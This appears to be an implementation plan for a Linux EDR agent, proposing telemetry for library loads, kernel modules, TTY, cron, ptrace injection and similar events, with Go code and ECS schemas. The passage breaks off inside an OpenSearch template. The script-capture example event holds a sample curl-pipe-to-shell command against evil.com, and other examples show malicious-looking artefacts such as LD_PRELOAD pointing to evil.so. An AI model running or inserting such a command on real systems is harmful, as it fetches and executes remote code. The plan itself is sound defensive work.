# Telemetry Gap Implementation Plan

> **Created:** 2026-03-02
> **Status:** Draft — Ready for implementation
> **Context:** Gap analysis against Elastic Defend, CrowdStrike Falcon, MS Defender for Endpoint, SentinelOne Singularity

---

## Table of Contents

1. [Overview](#overview)
2. [ECS Compatibility Strategy](#ecs-compatibility-strategy)
3. [Phase 2b — Critical Gaps](#phase-2b--critical-gaps)
   - [2b.1 Shared Library / SO Loading](#2b1-shared-library--so-loading)
   - [2b.2 Kernel Module Load/Unload](#2b2-kernel-module-loadunload)
   - [2b.3 TTY / Terminal I/O Capture](#2b3-tty--terminal-io-capture)
   - [2b.4 Scheduled Task / Cron Monitoring](#2b4-scheduled-task--cron-monitoring)
   - [2b.5 ptrace / Process Injection Monitoring](#2b5-ptrace--process-injection-monitoring)
4. [Phase 2c — High-Value Gaps](#phase-2c--high-value-gaps)
   - [2c.1 Environment Variable Capture](#2c1-environment-variable-capture)
   - [2c.2 Script Content Capture](#2c2-script-content-capture)
   - [2c.3 File Access (Read) Events](#2c3-file-access-read-events)
   - [2c.4 Named Pipe / Unix Socket IPC Monitoring](#2c4-named-pipe--unix-socket-ipc-monitoring)
   - [2c.5 File Entropy and Header Bytes](#2c5-file-entropy-and-header-bytes)
5. [Phase 2d — Medium Gaps](#phase-2d--medium-gaps)
   - [2d.1 Network Event Deduplication](#2d1-network-event-deduplication)
   - [2d.2 USB / Removable Media Monitoring](#2d2-usb--removable-media-monitoring)
   - [2d.3 Archive File Operation Tracking](#2d3-archive-file-operation-tracking)
   - [2d.4 Auditd / Linux Audit Integration](#2d4-auditd--linux-audit-integration)
   - [2d.5 Container Runtime Event Monitoring](#2d5-container-runtime-event-monitoring)
6. [OpenSearch Index Templates](#opensearch-index-templates)
7. [Testing Strategy](#testing-strategy)
8. [Rollout Order & Dependencies](#rollout-order--dependencies)

---

## Overview

This document provides a detailed, step-by-step plan for implementing 15 telemetry
capabilities identified as gaps between our xdr-agent and the market-leading EDR
solutions. Each item specifies:

- **What** data to collect and why it matters
- **How** to collect it on Linux (syscall, kernel interface, procfs, etc.)
- **ECS field mapping** for OpenSearch compatibility
- **Go package location** and struct design
- **Configuration** knobs (policy-driven enable/disable)
- **Estimated effort** and dependencies

All new telemetry follows the existing capability pattern:
1. Implement `capability.Capability` interface (`Name`, `Init`, `Start`, `Stop`, `Health`)
2. Emit events through the shared `events.Pipeline`
3. Use ECS-compatible JSON field names
4. Ship to OpenSearch via the existing control plane shipper

---

## ECS Compatibility Strategy

All new event types use [Elastic Common Schema (ECS)](https://www.elastic.co/guide/en/ecs/current/index.html)
field names. Where ECS does not define a field, we use a namespaced extension
(`xdr.*`) and document it for potential upstream contribution.

### Common base fields (all events)

```json
{
  "@timestamp": "2026-03-02T10:15:30.123Z",
  "event.kind": "event",
  "event.category": ["..."],
  "event.type": ["..."],
  "event.module": "xdr-agent",
  "agent.id": "...",
  "host.hostname": "...",
  "host.os.family": "linux",
  "ecs.version": "8.11.0"
}
```

### New ECS field sets introduced

| ECS Field Set | New Fields | Used By |
|---|---|---|
| `dll.*` | `dll.name`, `dll.path`, `dll.hash.sha256`, `dll.code_signature.signed` | SO loading |
| `process.env` | `process.env.LD_PRELOAD`, etc. | Env var capture |
| `process.io.text` | Terminal output content (array of strings) | TTY capture |
| `file.entropy` | Shannon entropy (float64) | File entropy |
| `file.header_bytes` | First 256 bytes, base64-encoded | File headers |
| `xdr.kernel_module.*` | `name`, `size`, `taint`, `loaded_by`, `hash.sha256` | Kernel modules |
| `xdr.injection.*` | `type`, `source.pid`, `target.pid`, `syscall` | ptrace/injection |
| `xdr.ipc.*` | `type`, `path`, `peer.pid` | IPC monitoring |
| `xdr.usb.*` | `vendor_id`, `product_id`, `serial_number`, `action` | USB monitoring |
| `xdr.container_event.*` | `action`, `exit_code` | Container events |

---

## Phase 2b — Critical Gaps

### 2b.1 Shared Library / SO Loading

**Security value:** Detects `LD_PRELOAD` injection, library hijacking, and malicious
shared object loading — used by virtually all Linux post-exploitation frameworks.

**MITRE ATT&CK:** T1574.006 (Dynamic Linker Hijacking), T1055.001 (Shared Library Injection)

**Collection method (two layers):**

1. **inotify layer (immediate, no root required for most paths):**
   - Watch `/lib/`, `/lib64/`, `/usr/lib/`, `/usr/lib64/`, `/usr/local/lib/`, `/usr/local/lib64/`
   - Watch common `LD_LIBRARY_PATH` directories
   - Events: `IN_CREATE`, `IN_MOVED_TO`, `IN_CLOSE_WRITE`
   - On event: hash the new/modified `.so` file, emit `library.load` event

2. **eBPF/kprobe layer (real-time, needs CAP_BPF or root):**
   - Attach kprobe to `security_file_open` or `do_open_execat`
   - Filter for files with `.so` extension or ELF magic bytes
   - Capture: PID, comm, filename, flags
   - Fall back to `/proc/[pid]/maps` diff polling if eBPF unavailable

**Go package:** `internal/telemetry/library/`

```
internal/telemetry/library/
├── capability.go     // Capability interface implementation
├── inotify.go        // inotify watcher for SO directories
├── maps_poller.go    // /proc/[pid]/maps diff fallback
└── library_test.go   // Unit tests
```

**Event schema:**

```go
type LibraryLoadEvent struct {
    DLL struct {
        Name string `json:"dll.name"`          // e.g. "libevil.so"
        Path string `json:"dll.path"`          // e.g. "/usr/lib/libevil.so"
        Hash struct {
            SHA256 string `json:"dll.hash.sha256"`
        } `json:"dll.hash"`
        Signed bool `json:"dll.code_signature.signed"` // ELF signature check
    } `json:"dll"`
    Process struct {
        PID  int    `json:"process.pid"`
        Name string `json:"process.name"`
        Exe  string `json:"process.executable"`
    } `json:"process"`
}
```

**ECS event fields:**
- `event.category`: `["library"]`
- `event.type`: `["start"]`
- `event.action`: `library_load`

**Configuration:**

```yaml
capabilities:
  telemetry.library:
    enabled: true
    watch_paths:
      - /lib/
      - /lib64/
      - /usr/lib/
      - /usr/lib64/
      - /usr/local/lib/
    hash_on_load: true
    use_ebpf: auto           # auto | kprobe | polling
    polling_interval: 30s    # fallback polling interval
```

**Estimated effort:** 3–4 days
**Dependencies:** None (can use inotify first, eBPF later)

---

### 2b.2 Kernel Module Load/Unload

**Security value:** Rootkits and advanced persistent threats load malicious kernel
modules. Every competitor detects this.

**MITRE ATT&CK:** T1547.006 (Kernel Modules and Extensions), T1014 (Rootkit)

**Collection method (three layers, highest priority first):**

1. **`/proc/modules` polling (simplest, always available):**
   - Read `/proc/modules` every 10s (configurable)
   - Diff against previous snapshot: new entries = loaded, missing entries = unloaded
   - For new modules: resolve path via `/sys/module/<name>/`, hash the `.ko` file
   - If running inside a container, skip (modules are host-level)

2. **kprobe on `do_init_module` / `delete_module` (real-time):**
   - Attach kprobe to `do_init_module` (load) and `delete_module` (unload)
   - Capture: module name, size, taint flags, loading PID/comm

3. **eBPF (Phase 7 upgrade):**
   - BPF program on `module_load` / `module_free` tracepoints

**Go package:** `internal/telemetry/kernel/modules.go` (already scaffolded)

**Event schema:**

```go
type KernelModuleEvent struct {
    Module struct {
        Name     string `json:"xdr.kernel_module.name"`
        Size     int64  `json:"xdr.kernel_module.size"`
        Taint    string `json:"xdr.kernel_module.taint"`
        Path     string `json:"xdr.kernel_module.path"`       // /lib/modules/.../
        Hash     string `json:"xdr.kernel_module.hash.sha256"`
        LoadedBy struct {
            PID  int    `json:"process.pid"`
            Name string `json:"process.name"`
        }
    }
}
```

**ECS event fields:**
- `event.category`: `["driver"]`
- `event.type`: `["start"]` (load) or `["end"]` (unload)
- `event.action`: `kernel_module_load` / `kernel_module_unload`

**Configuration:**

```yaml
capabilities:
  telemetry.kernel_module:
    enabled: true
    polling_interval: 10s
    hash_modules: true
    use_kprobe: auto  # auto | polling
```

**Estimated effort:** 2–3 days
**Dependencies:** None for polling; kprobe requires `internal/platform/linux/kprobe.go` helper

---

### 2b.3 TTY / Terminal I/O Capture

**Security value:** Records actual commands typed and output seen in terminal sessions.
Critical for forensic reconstruction when an attacker has shell access.
Elastic Defend ships this on Linux with configurable size limits.

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter)

**Collection method:**

1. **`/dev/pts/*` monitoring via eBPF kprobe on `tty_write`:**
   - Attach kprobe to `tty_write` kernel function
   - Capture: PID, session ID, bytes written, TTY device
   - Buffer output per-session, batch into events at configurable intervals

2. **Fallback: `/proc/[pid]/fd/` + TTY device polling:**
   - For each process with a TTY (from `process.tty.char_device.major` != 0):
     scan `/proc/[pid]/fd/` for pts devices, read via `TIOCGWINSZ`
   - Less reliable; best-effort only

**Size controls (matching Elastic Defend):**
- `max_event_interval_seconds`: 30 (default)
- `max_kilobytes_per_event`: 512 (default)
- `max_kilobytes_per_process`: 512 (default)

**Go package:** `internal/telemetry/tty/`

```
internal/telemetry/tty/
├── capability.go     // Capability interface
├── capture.go        // TTY write capture logic
├── buffer.go         // Per-session output buffering
└── tty_test.go
```

**Event schema:**

```go
type TTYEvent struct {
    Process struct {
        PID       int    `json:"process.pid"`
        Name      string `json:"process.name"`
        EntityID  string `json:"process.entity_id"`
        TTY struct {
            Name    string `json:"process.tty.name"`    // "pts/0"
            Rows    int    `json:"process.tty.rows"`
            Columns int    `json:"process.tty.columns"`
        }
    }
    IO struct {
        Text  []string `json:"process.io.text"`   // lines of output
        Bytes int64    `json:"process.io.bytes"`
        Type  string   `json:"process.io.type"`   // "output"
    }
}
```

**ECS event fields:**
- `event.category`: `["process"]`
- `event.type`: `["info"]`
- `event.action`: `tty_output`

**Configuration:**

```yaml
capabilities:
  telemetry.tty:
    enabled: true
    max_event_interval: 30s
    max_kb_per_event: 512
    max_kb_per_process: 512
    exclude_users: []    # optional: skip noisy service accounts
```

**Estimated effort:** 4–5 days (eBPF kprobe is more complex)
**Dependencies:** eBPF helper (`internal/platform/linux/ebpf.go`); fallback requires no deps

---

### 2b.4 Scheduled Task / Cron Monitoring

**Security value:** Attackers use cron jobs, at jobs, and systemd timers for persistence.
All four competitors detect this. We have a stub but no implementation.

**MITRE ATT&CK:** T1053.003 (Cron), T1053.005 (Scheduled Task)

**Collection method:**

1. **inotify watches (real-time):**
   - `/etc/crontab`
   - `/etc/cron.d/`
   - `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`
   - `/var/spool/cron/crontabs/` (per-user crontabs)
   - `/etc/systemd/system/*.timer`, `/usr/lib/systemd/system/*.timer`
   - `/etc/at.deny`, `/etc/at.allow`, `/var/spool/at/`
   - Events: `IN_CREATE`, `IN_MODIFY`, `IN_DELETE`, `IN_MOVED_TO`

2. **Crontab parsing:**
   - On change: read and parse the crontab entry (schedule, user, command)
   - For systemd timers: parse the `.timer` unit file for `OnCalendar`, `OnBootSec`, etc.

3. **Periodic rescan (ground truth):**
   - Every 5 minutes, enumerate all crontab/timer entries and diff against snapshot
   - Detect changes that bypassed inotify (e.g., direct database modification)

**Go package:** `internal/telemetry/scheduled/` (already scaffolded as stub)

```
internal/telemetry/scheduled/
├── capability.go     // Capability interface
├── cron.go           // Crontab inotify + parsing
├── systemd_timer.go  // systemd timer monitoring + parsing
├── at.go             // at job monitoring
├── rescan.go         // Periodic full rescan
└── scheduled_test.go
```

**Event schema:**

```go
type ScheduledTaskEvent struct {
    ScheduledTask struct {
        Name     string `json:"xdr.scheduled_task.name"`
        Type     string `json:"xdr.scheduled_task.type"`     // cron | systemd_timer | at
        Schedule string `json:"xdr.scheduled_task.schedule"` // "*/5 * * * *" or "OnCalendar=daily"
        Command  string `json:"xdr.scheduled_task.command"`
        User     string `json:"xdr.scheduled_task.user"`
        Path     string `json:"file.path"`                   // path to the crontab/timer file
    }
    File struct {
        Hash string `json:"file.hash.sha256"`
    }
}
```

**ECS event fields:**
- `event.category`: `["configuration"]`
- `event.type`: `["creation"]`, `["change"]`, or `["deletion"]`
- `event.action`: `scheduled_task_created` / `scheduled_task_modified` / `scheduled_task_deleted`

**Configuration:**

```yaml
capabilities:
  telemetry.scheduled:
    enabled: true
    rescan_interval: 5m
    watch_paths:
      - /etc/crontab
      - /etc/cron.d/
      - /var/spool/cron/crontabs/
    parse_entries: true
```

**Estimated effort:** 3–4 days
**Dependencies:** Reuses inotify patterns from FIM capability

---

### 2b.5 ptrace / Process Injection Monitoring

**Security value:** `ptrace` and `process_vm_writev` are the primary Linux mechanisms
for code injection. `memfd_create` enables fileless execution.

**MITRE ATT&CK:** T1055 (Process Injection), T1055.008 (Ptrace System Calls)

**Collection method:**

1. **eBPF tracepoints (preferred, real-time):**
   - `sys_enter_ptrace` — capture: request type (PTRACE_ATTACH, PTRACE_POKETEXT, etc.), target PID
   - `sys_enter_process_vm_writev` — capture: target PID, remote iov count
   - `sys_enter_memfd_create` — capture: name, flags (MFD_CLOEXEC)
   - `sys_enter_execveat` with `AT_EMPTY_PATH` flag (memfd execution)

2. **Fallback: Audit subsystem (if eBPF unavailable):**
   - Add audit rules: `-a always,exit -F arch=b64 -S ptrace -S process_vm_writev -S memfd_create`
   - Parse audit log for these syscalls

3. **`/proc/[pid]/status` polling (lightweight supplement):**
   - Check `TracerPid` field; if non-zero, a process is being traced
   - Poll every 5s; emit event when TracerPid changes from 0 to non-zero

**Go package:** `internal/telemetry/injection/`

```
internal/telemetry/injection/
├── capability.go     // Capability interface
├── ebpf.go           // eBPF tracepoint programs
├── audit_fallback.go // Audit rule fallback
├── tracer_poll.go    // /proc/[pid]/status TracerPid polling
└── injection_test.go
```

**Event schema:**

```go
type InjectionEvent struct {
    Injection struct {
        Type    string `json:"xdr.injection.type"`          // ptrace | process_vm_writev | memfd_create
        Syscall string `json:"xdr.injection.syscall"`       // "ptrace"
        Request string `json:"xdr.injection.ptrace_request"` // "PTRACE_ATTACH"
        Source  struct {
            PID  int    `json:"xdr.injection.source.pid"`
            Name string `json:"xdr.injection.source.name"`
        }
        Target struct {
            PID  int    `json:"xdr.injection.target.pid"`
            Name string `json:"xdr.injection.target.name"`
        }
    }
}
```

**ECS event fields:**
- `event.category`: `["intrusion_detection"]`
- `event.type`: `["info"]`
- `event.action`: `ptrace_attach` / `process_vm_writev` / `memfd_create`

**Configuration:**

```yaml
capabilities:
  telemetry.injection:
    enabled: true
    use_ebpf: auto          # auto | audit | polling
    polling_interval: 5s    # for TracerPid fallback
    ignore_debuggers:       # optional: don't alert on known debuggers
      - gdb
      - strace
      - lldb
```

**Estimated effort:** 5–6 days (eBPF programs + fallback)
**Dependencies:** `internal/platform/linux/ebpf.go` helper (can start with audit/polling fallback)

---

## Phase 2c — High-Value Gaps

### 2c.1 Environment Variable Capture

**Security value:** `LD_PRELOAD` and `LD_LIBRARY_PATH` manipulation are primary
injection vectors. Elastic Defend captures up to 5 env vars per process event.

**MITRE ATT&CK:** T1574.006 (Dynamic Linker Hijacking)

**Collection method:**
- On `process.start` events, read `/proc/[pid]/environ` (NUL-separated key=value pairs)
- Filter to only the configured variable names (default: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`, `HOME`, `SHELL`)
- Add to the existing process event payload — no separate event type needed

**Go implementation:** `internal/telemetry/process/envvars.go`

```go
// ReadProcessEnvVars reads selected environment variables from /proc/[pid]/environ
func ReadProcessEnvVars(pid int, varNames []string) (map[string]string, error) {
    data, err := os.ReadFile(fmt.Sprintf("/proc/%d/environ", pid))
    if err != nil {
        return nil, err
    }
    result := make(map[string]string)
    for _, entry := range bytes.Split(data, []byte{0}) {
        parts := bytes.SplitN(entry, []byte("="), 2)
        if len(parts) == 2 {
            key := string(parts[0])
            for _, wanted := range varNames {
                if key == wanted {
                    result[key] = string(parts[1])
                }
            }
        }
    }
    return result, nil
}
```

**ECS mapping:** `process.env` (object with variable names as keys)

```json
{
  "process.env": {
    "LD_PRELOAD": "/tmp/evil.so",
    "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"
  }
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.process:
    capture_env_vars:
      - LD_PRELOAD
      - LD_LIBRARY_PATH
      - PATH
      - HOME
      - SHELL
    max_env_vars: 5
```

**Estimated effort:** 0.5–1 day (extends existing process capability)
**Dependencies:** None — extends `internal/telemetry/process/`

---

### 2c.2 Script Content Capture

**Security value:** When attackers run `bash -c 'encoded payload'` or `python -c '...'`,
capturing the script body provides forensic evidence of exactly what was executed.

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1059.006 (Python)

**Collection method:**
- On `process.start`, check if the executable is a known interpreter:
  `bash`, `sh`, `dash`, `zsh`, `fish`, `python`, `python3`, `perl`, `ruby`, `node`
- If the first argument is a file path: read first N bytes of that file (default: 4096)
- If the argument is `-c` followed by inline code: capture the inline string
- Truncate at `max_script_size` to avoid memory issues

**Go package:** `internal/telemetry/script/`

```
internal/telemetry/script/
├── capture.go        // Script content capture logic
└── capture_test.go
```

**Event enrichment** (added to existing `process.start` events):

```json
{
  "process.args": ["python3", "-c", "import os; os.system('curl ...')"],
  "xdr.script.content": "import os; os.system('curl http://evil.com/payload | sh')",
  "xdr.script.interpreter": "python3",
  "xdr.script.length": 56,
  "xdr.script.truncated": false
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.script:
    enabled: true
    max_script_size: 4096       # bytes
    interpreters:
      - bash
      - sh
      - python
      - python3
      - perl
      - ruby
      - node
```

**Estimated effort:** 1–2 days
**Dependencies:** None — enriches existing process events

---

### 2c.3 File Access (Read) Events

**Security value:** Detects when attackers read `/etc/shadow`, SSH private keys, or
other credential files. Elastic Defend supports configurable `event_on_access.file_paths`.

**MITRE ATT&CK:** T1003.008 (/etc/passwd and /etc/shadow), T1552.004 (Private Keys)

**Collection method:**
- Add `IN_ACCESS` flag to inotify watches on configurable sensitive paths
- Default watched paths for read access:
  - `/etc/shadow`, `/etc/gshadow`
  - `/root/.ssh/`, `/home/*/.ssh/id_*`
  - `/etc/ssh/ssh_host_*_key`
  - `/etc/ssl/private/`
- PID enrichment: correlate inotify event with `/proc/` scan to find accessing process

**Go implementation:** Extend `internal/telemetry/file/fim.go`

- Add new `accessPaths` config list
- Add `IN_ACCESS` to inotify mask for those specific paths only
- Emit events with `event.action: "access"` (distinct from create/modify/delete)

**Event schema:**

```json
{
  "event.category": ["file"],
  "event.type": ["access"],
  "event.action": "file_access",
  "file.path": "/etc/shadow",
  "file.name": "shadow",
  "process.pid": 1234,
  "process.name": "cat",
  "process.executable": "/usr/bin/cat"
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.file:
    access_monitoring:
      enabled: true
      paths:
        - /etc/shadow
        - /etc/gshadow
        - /root/.ssh/
        - /etc/ssh/ssh_host_*_key
```

**Estimated effort:** 1–2 days
**Dependencies:** Extends existing FIM capability

---

### 2c.4 Named Pipe / Unix Socket IPC Monitoring

**Security value:** Adversaries use named pipes and Unix domain sockets for covert
command-and-control channels between processes.

**MITRE ATT&CK:** T1559 (Inter-Process Communication)

**Collection method:**

1. **Named pipes:** inotify on `/tmp/`, `/var/run/`, `/dev/shm/` for FIFO creation
   (`IN_CREATE` + check `Stat.Mode().Type() == os.ModeNamedPipe`)

2. **Unix domain sockets:** Poll `/proc/net/unix` every 15s
   - Diff snapshots: new sockets = connected, missing = disconnected
   - Parse: path, type (STREAM/DGRAM), state, inode
   - Enrich with PID via `/proc/[pid]/fd/` → inode mapping

**Go package:** `internal/telemetry/ipc/`

```
internal/telemetry/ipc/
├── capability.go     // Capability interface
├── pipes.go          // Named pipe inotify monitoring
├── unix_sockets.go   // /proc/net/unix polling
└── ipc_test.go
```

**Event schema:**

```json
{
  "event.category": ["network"],
  "event.type": ["connection"],
  "event.action": "unix_socket_created",
  "xdr.ipc.type": "unix_socket",
  "xdr.ipc.path": "/tmp/.hidden_socket",
  "xdr.ipc.socket_type": "STREAM",
  "process.pid": 5678,
  "process.name": "reverse_shell"
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.ipc:
    enabled: true
    watch_paths:
      - /tmp/
      - /var/run/
      - /dev/shm/
    polling_interval: 15s
    exclude_paths:
      - /var/run/docker.sock    # too noisy
```

**Estimated effort:** 2–3 days
**Dependencies:** None

---

### 2c.5 File Entropy and Header Bytes

**Security value:** High Shannon entropy (>7.5) strongly indicates encrypted or packed
content. Header bytes enable file-type classification without full scan.

**Collection method:**
- On `file.created` and `file.modified` events (already produced by FIM):
  1. Read first 256 bytes → base64-encode as `file.header_bytes`
  2. Compute Shannon entropy over entire file (up to 10 MiB limit)
  3. If entropy > threshold (default 7.5): add `tags: ["high_entropy"]`

**Go implementation:** Extend `internal/telemetry/file/`

```go
// ShannonEntropy computes the Shannon entropy of data in bits per byte.
func ShannonEntropy(data []byte) float64 {
    if len(data) == 0 {
        return 0
    }
    var freq [256]float64
    for _, b := range data {
        freq[b]++
    }
    n := float64(len(data))
    var entropy float64
    for _, f := range freq {
        if f > 0 {
            p := f / n
            entropy -= p * math.Log2(p)
        }
    }
    return entropy
}
```

**ECS mapping:**

```json
{
  "file.path": "/tmp/payload.bin",
  "file.entropy": 7.89,
  "file.header_bytes": "f0VMRgIBAQAAAAAAAAAAAA...",
  "tags": ["high_entropy"]
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.file:
    entropy:
      enabled: true
      max_file_size_mb: 10
      high_entropy_threshold: 7.5
    header_bytes:
      enabled: true
      size: 256
```

**Estimated effort:** 1 day
**Dependencies:** None — extends existing FIM

---

## Phase 2d — Medium Gaps

### 2d.1 Network Event Deduplication

**Security value:** Reduces event volume by 30–60% for high-connection endpoints
(web servers, databases), matching Elastic Defend's 8.15+ behavior.

**Collection method:**
- Maintain a sliding-window dedup cache keyed on `(src_ip, dst_ip, dst_port, pid)` tuple
- First connection in a window → emit full event
- Subsequent connections within TTL → increment counter only
- On window expiry: emit summary event with `network.connections_suppressed` count
- Configurable byte threshold: connections transferring more than threshold always emit

**Go implementation:** Extend `internal/telemetry/network/connections.go`

```go
type DedupKey struct {
    SrcIP   string
    DstIP   string
    DstPort int
    PID     int
}

type DedupEntry struct {
    FirstSeen time.Time
    LastSeen  time.Time
    Count     int
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.network:
    deduplication:
      enabled: true
      window: 60s
      byte_threshold: 1048576  # 1 MiB — connections above this always emit
```

**Estimated effort:** 1–2 days
**Dependencies:** None

---

### 2d.2 USB / Removable Media Monitoring

**Security value:** Detects data exfiltration via USB and unauthorized device connections.

**MITRE ATT&CK:** T1052.001 (Exfiltration over USB), T1200 (Hardware Additions)

**Collection method:**
- Listen on `AF_NETLINK` socket with `NETLINK_KOBJECT_UEVENT` for USB events
- Filter for `SUBSYSTEM=usb` and `DEVTYPE=usb_device`
- Parse: ACTION (add/remove), PRODUCT (vendor_id/product_id), SERIAL, DEVNAME
- For mass storage: also watch block device creation via udev

**Go package:** `internal/telemetry/usb/`

```
internal/telemetry/usb/
├── capability.go     // Capability interface
├── udev.go           // Netlink KOBJECT_UEVENT listener
├── parser.go         // USB uevent key-value parser
└── usb_test.go
```

**Event schema:**

```json
{
  "event.category": ["host"],
  "event.type": ["info"],
  "event.action": "usb_device_connected",
  "xdr.usb.vendor_id": "0781",
  "xdr.usb.product_id": "5583",
  "xdr.usb.vendor_name": "SanDisk",
  "xdr.usb.product_name": "Ultra Fit",
  "xdr.usb.serial_number": "4C530001131024117015",
  "xdr.usb.action": "add",
  "xdr.usb.device_class": "mass_storage"
}
```

**Estimated effort:** 2–3 days
**Dependencies:** None

---

### 2d.3 Archive File Operation Tracking

**Security value:** Adversaries stage data for exfiltration by creating archives.

**MITRE ATT&CK:** T1560 (Archive Collected Data)

**Collection method:**
- Extend FIM: on `file.created` / `file.modified` events, check magic bytes:
  - ZIP: `\x50\x4b\x03\x04`
  - GZIP: `\x1f\x8b`
  - TAR: `ustar` at offset 257
  - RAR: `\x52\x61\x72\x21`
  - 7Z: `\x37\x7a\xbc\xaf`
  - XZ: `\xfd\x37\x7a\x58\x5a`
- If match: enrich event with `file.archive.type` and monitor for size growth

**Go implementation:** Extend `internal/telemetry/file/`

```go
var archiveMagic = map[string][]byte{
    "zip":  {0x50, 0x4b, 0x03, 0x04},
    "gzip": {0x1f, 0x8b},
    "rar":  {0x52, 0x61, 0x72, 0x21},
    "7z":   {0x37, 0x7a, 0xbc, 0xaf},
    "xz":   {0xfd, 0x37, 0x7a, 0x58, 0x5a},
}
```

**ECS mapping:**

```json
{
  "file.path": "/tmp/exfil.tar.gz",
  "file.archive.type": "gzip",
  "file.size": 52428800,
  "tags": ["archive_created"]
}
```

**Estimated effort:** 0.5–1 day
**Dependencies:** Extends FIM; leverages file.header_bytes from 2c.5

---

### 2d.4 Auditd / Linux Audit Integration

**Security value:** The Linux audit subsystem provides kernel-level syscall logging,
process accounting, and access control enforcement. This is the authoritative
record for compliance and forensics.

**Collection method (two options):**

1. **AF_NETLINK AUDIT socket (preferred):**
   - Open `AF_NETLINK` / `NETLINK_AUDIT` socket
   - Set audit rules programmatically: `auditctl` equivalents via netlink messages
   - Receive and parse audit records (key-value format)
   - Map to ECS fields

2. **Journald / log tailing (fallback):**
   - Tail `/var/log/audit/audit.log` or connect to journald `_TRANSPORT=audit`
   - Parse audit log lines (type=SYSCALL msg=audit(...): ...)

**Go package:** `internal/telemetry/audit/` (already scaffolded as stub)

```
internal/telemetry/audit/
├── capability.go     // Capability interface
├── netlink.go        // AF_NETLINK AUDIT socket client
├── parser.go         // Audit record key-value parser
├── rules.go          // Audit rule management
├── ecs_mapper.go     // Audit record → ECS event mapping
└── audit_test.go
```

**ECS mapping:**

```json
{
  "event.category": ["process"],
  "event.type": ["info"],
  "event.action": "syscall",
  "auditd.result": "success",
  "auditd.sequence": 12345,
  "auditd.data.syscall": "execve",
  "auditd.data.exe": "/usr/bin/curl",
  "auditd.data.a0": "0x7ffd...",
  "process.pid": 1234,
  "user.id": "0"
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.audit:
    enabled: true
    method: auto           # auto | netlink | log_tail
    rules:
      - "-a always,exit -F arch=b64 -S execve -S execveat"
      - "-a always,exit -F arch=b64 -S ptrace"
      - "-w /etc/passwd -p wa -k identity"
```

**Estimated effort:** 5–7 days (complex netlink protocol)
**Dependencies:** None, but benefits from `internal/platform/linux/auditd.go` helper

---

### 2d.5 Container Runtime Event Monitoring

**Security value:** Detect container escape, unauthorized exec-into, drift (file changes
vs. original image), and suspicious container lifecycle events.

**MITRE ATT&CK:** T1610 (Deploy Container), T1611 (Escape to Host)

**Collection method:**
- Connect to container runtime Unix socket:
  - Docker: `/var/run/docker.sock` → `GET /events` SSE stream
  - containerd: `/run/containerd/containerd.sock` → gRPC events
  - CRI-O: `/var/run/crio/crio.sock`
- Subscribe to events: `container.start`, `container.stop`, `container.die`, `container.exec_create`, `container.exec_start`
- Enrich all agent events with `container.*` fields when running inside a container

**Go package:** `internal/telemetry/container/`

```
internal/telemetry/container/
├── capability.go     // Capability interface
├── docker.go         // Docker socket event stream
├── containerd.go     // containerd gRPC event stream
├── enricher.go       // Container metadata enrichment for all events
└── container_test.go
```

**Event schema:**

```json
{
  "event.category": ["host"],
  "event.type": ["start"],
  "event.action": "container_started",
  "container.id": "abc123...",
  "container.name": "web-app",
  "container.image.name": "nginx",
  "container.image.tag": "1.25",
  "container.runtime": "docker",
  "xdr.container_event.action": "start",
  "xdr.container_event.exit_code": 0
}
```

**Configuration:**

```yaml
capabilities:
  telemetry.container:
    enabled: auto          # auto-detect container runtime
    socket_paths:
      docker: /var/run/docker.sock
      containerd: /run/containerd/containerd.sock
    enrich_all_events: true
```

**Estimated effort:** 4–5 days
**Dependencies:** Docker/containerd client libraries (Go standard HTTP for Docker, gRPC for containerd)

---

## OpenSearch Index Templates

New telemetry types require OpenSearch index template updates. Each new event type
ships to the existing `xdr-events-*` index pattern. Add field mappings:

```json
{
  "index_patterns": ["xdr-events-*"],
  "template": {
    "mappings": {
      "properties": {
        "dll": {
          "properties": {
            "name": { "type": "keyword" },
            "path": { "type": "keyword" },
            "hash": {
              "properties": {
                "sha256": { "type": "keyword" }
              }
            },
            "code_signature": {
              "properties": {
                "signed": { "type": "boolean" }
              }
            }
          }
        },
        "xdr": {
          "properties": {
            "kernel_module": {
              "properties": {
                "name": { "type": "keyword" },
                "size": { "type": "long" },
                "taint": { "type": "keyword" },
                "path": { "type": "keyword" },
                "hash": {
                  "properties": {
                    "sha256": { "type": "keyword" }
                  }
                }
              }
            },
            "injection": {
              "properties": {
                "type": { "type": "keyword" },
                "syscall": { "type": "keyword" },
                "ptrace_request": { "type": "keyword" },
                "source": {
                  "properties": {
                    "pid": { "type": "long" },
                    "name": { "type": "keyword" }
                  }
                },
                "target": {
                  "properties": {
                    "pid": { "type": "long" },
                    "name": { "type": "keyword" }
                  }
                }
              }
            },
            "scheduled_task": {
              "properties": {
                "name": { "type": "keyword" },
                "type": { "type": "keyword" },
                "schedule": { "type": "keyword" },
                "command": { "type": "text" },
                "user": { "type": "keyword" }
              }
            },
            "ipc": {
              "properties": {
                "type": { "type": "keyword" },
                "path": { "type": "keyword" },
                "socket_type": { "type": "keyword" },
                "peer": {
                  "properties": {
                    "pid": { "type": "long" }
                  }
                }
              }
            },
            "usb": {
              "properties": {
                "vendor_id": { "type": "keyword" },
                "product_id": { "type": "keyword" },
                "vendor_name": { "type": "keyword" },
                "product_name": { "type": "keyword" },
                "serial_number": { "type": "keyword" },
                "action": { "type": "keyword" },
                "device_class": { "type": "keyword" }
              }
            },
            "script": {
              "properties": {
                "content": { "type": "text" },
                "interpreter": { "type": "keyword" },
                "length": { "type": "long" },
                "truncated": { "type": "boolean" }
              }
            },
            "container_event": {
              "properties": {
                "action": { "type": "keyword" },
                "exit_code": { "type": "integer" }
              }
            }
          }
        },
        "process": {
          "properties": {
            "env": { "type": "object", "enabled": true },
            "io": {
              "properties": {
                "text": { "type": "text" },
                "bytes": { "type": "long" },
                "type": { "type": "keyword" }
              }
            },
            "tty": {
              "properties": {
                "rows": { "type": "integer" },
                "columns": { "type": "integer" }
              }
            }
          }
        },
